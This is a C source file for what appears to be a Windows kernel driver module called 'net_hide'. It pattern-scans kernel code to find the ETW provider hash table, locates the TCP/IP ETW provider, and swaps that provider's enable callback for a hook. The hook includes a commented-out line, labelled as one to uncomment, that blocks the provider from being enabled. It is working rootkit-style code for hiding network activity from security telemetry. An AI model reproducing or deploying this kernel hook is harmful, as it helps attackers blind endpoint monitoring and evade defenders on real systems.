#include "net_hide.h"
#include "offsets.h"

BOOLEAN g_ProviderHookEnabled = FALSE;
PETW_GUID_ENTRY g_TcpIpGuidEntry = NULL;
PETWENABLECALLBACK g_OriginalTcpIpCallback = NULL;
static PETW_REG_ENTRY g_HookedRegEntry = NULL;
static PVOID g_EtwpGuidHashTable = NULL;

#define ETW_GUID_HASH_BUCKETS 64

static ULONG EtwpGuidHash(PGUID Guid)
{
    PULONG data = (PULONG)Guid;
    return (data[0] ^ data[1] ^ data[2] ^ data[3]) % ETW_GUID_HASH_BUCKETS;
}

PVOID FindEtwpGuidHashTable()
{
    UNICODE_STRING funcName;
    PUCHAR funcAddr;
    PUCHAR searchEnd;
    
    RtlInitUnicodeString(&funcName, L"EtwRegister");
    funcAddr = (PUCHAR)MmGetSystemRoutineAddress(&funcName);
    
    if (!funcAddr)
        return NULL;
    
    searchEnd = funcAddr + 0x500;
    
    for (PUCHAR p = funcAddr; p < searchEnd; p++)
    {
        __try
        {
            if ((p[0] == 0x48 || p[0] == 0x4C) && p[1] == 0x8D)
            {
                UCHAR modrm = p[2];
                if ((modrm & 0xC7) == 0x05 || (modrm & 0xC7) == 0x0D || 
                    (modrm & 0xC7) == 0x15 || (modrm & 0xC7) == 0x1D ||
                    (modrm & 0xC7) == 0x25 || (modrm & 0xC7) == 0x2D ||
                    (modrm & 0xC7) == 0x35 || (modrm & 0xC7) == 0x3D)
                {
                    LONG offset = *(PLONG)(p + 3);
                    PVOID target = (PVOID)(p + 7 + offset);
                    
                    if ((ULONG64)target > 0xFFFF800000000000ULL && MmIsAddressValid(target))
                    {
                        PETW_HASH_BUCKET bucket = (PETW_HASH_BUCKET)target;
                        if (MmIsAddressValid(bucket->ListHead.Flink))
                            return target;
                    }
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }
    
    return NULL;
}

PETW_GUID_ENTRY FindEtwGuidEntry(PGUID TargetGuid)
{
    if (!g_EtwpGuidHashTable || !TargetGuid)
        return NULL;
    
    ULONG hash = EtwpGuidHash(TargetGuid);
    PETW_HASH_BUCKET bucket = &((PETW_HASH_BUCKET)g_EtwpGuidHashTable)[hash];
    
    __try
    {
        if (!MmIsAddressValid(bucket) || !MmIsAddressValid(&bucket->ListHead))
            return NULL;
        
        PLIST_ENTRY entry = bucket->ListHead.Flink;
        ULONG count = 0;
        
        while (entry != &bucket->ListHead && count < 1000)
        {
            if (!MmIsAddressValid(entry))
                break;
            
            PETW_GUID_ENTRY guidEntry = CONTAINING_RECORD(entry, ETW_GUID_ENTRY, GuidList);
            
            if (!MmIsAddressValid(guidEntry))
                break;
            
            if (RtlCompareMemory(&guidEntry->Guid, TargetGuid, sizeof(GUID)) == sizeof(GUID))
                return guidEntry;
            
            entry = entry->Flink;
            count++;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    
    return NULL;
}

VOID NTAPI HookedEnableCallback(
    LPCGUID SourceId, ULONG ControlCode, UCHAR Level,
    ULONGLONG MatchAnyKeyword, ULONGLONG MatchAllKeyword,
    PEVENT_FILTER_DESCRIPTOR FilterData, PVOID CallbackContext)
{
    UNREFERENCED_PARAMETER(FilterData);
    
    // uncomment to block TcpIp ETW provider
    /*
    if (ControlCode == EVENT_CONTROL_CODE_ENABLE_PROVIDER)
        return;
    */
    
    if (g_OriginalTcpIpCallback)
        g_OriginalTcpIpCallback(SourceId, ControlCode, Level, MatchAnyKeyword, MatchAllKeyword, FilterData, CallbackContext);
}

// 使用动态偏移获取 Callback 指针
static PVOID* GetRegEntryCallbackPtr(PETW_REG_ENTRY RegEntry)
{
    return (PVOID*)((ULONG64)RegEntry + g_Offsets.EtwRegEntry_Callback);
}

NTSTATUS HookProviderCallback(PETW_GUID_ENTRY GuidEntry)
{
    if (!GuidEntry)
        return STATUS_INVALID_PARAMETER;
    
    __try
    {
        if (!MmIsAddressValid(&GuidEntry->RegListHead))
            return STATUS_INVALID_ADDRESS;
        
        PLIST_ENTRY entry = GuidEntry->RegListHead.Flink;
        ULONG count = 0;
        
        while (entry != &GuidEntry->RegListHead && count < 100)
        {
            if (!MmIsAddressValid(entry))
                break;
            
            PETW_REG_ENTRY regEntry = CONTAINING_RECORD(entry, ETW_REG_ENTRY, RegList);
            
            if (!MmIsAddressValid(regEntry))
                break;
            
            PVOID* callbackPtr = GetRegEntryCallbackPtr(regEntry);
            PVOID callback = *callbackPtr;
            
            if (callback && MmIsAddressValid(callback))
            {
                g_OriginalTcpIpCallback = (PETWENABLECALLBACK)callback;
                g_HookedRegEntry = regEntry;
                
                InterlockedExchangePointer(callbackPtr, HookedEnableCallback);
                g_ProviderHookEnabled = TRUE;
                
                return STATUS_SUCCESS;
            }
            
            entry = entry->Flink;
            count++;
        }
        
        return STATUS_NOT_FOUND;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        return STATUS_ACCESS_VIOLATION;
    }
}

VOID UnhookProviderCallback()
{
    if (!g_ProviderHookEnabled || !g_HookedRegEntry || !g_OriginalTcpIpCallback)
        return;
    
    __try
    {
        if (MmIsAddressValid(g_HookedRegEntry))
        {
            PVOID* callbackPtr = GetRegEntryCallbackPtr(g_HookedRegEntry);
            InterlockedExchangePointer(callbackPtr, g_OriginalTcpIpCallback);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    
    g_ProviderHookEnabled = FALSE;
    g_HookedRegEntry = NULL;
    g_OriginalTcpIpCallback = NULL;
}

NTSTATUS NetHideInitialize()
{
    NTSTATUS status;
    
    status = FilterInitialize();
    if (!NT_SUCCESS(status))
        return status;
    
    g_EtwpGuidHashTable = FindEtwpGuidHashTable();
    if (!g_EtwpGuidHashTable)
        return STATUS_SUCCESS;
    
    g_TcpIpGuidEntry = FindEtwGuidEntry((PGUID)&TcpIpGuid);
    if (!g_TcpIpGuidEntry)
        g_TcpIpGuidEntry = FindEtwGuidEntry((PGUID)&MsTcpIpGuid);
    
    if (!g_TcpIpGuidEntry)
        return STATUS_SUCCESS;
    
    HookProviderCallback(g_TcpIpGuidEntry);
    
    return STATUS_SUCCESS;
}

VOID NetHideCleanup()
{
    UnhookProviderCallback();
    FilterCleanup();
    
    g_EtwpGuidHashTable = NULL;
    g_TcpIpGuidEntry = NULL;
}
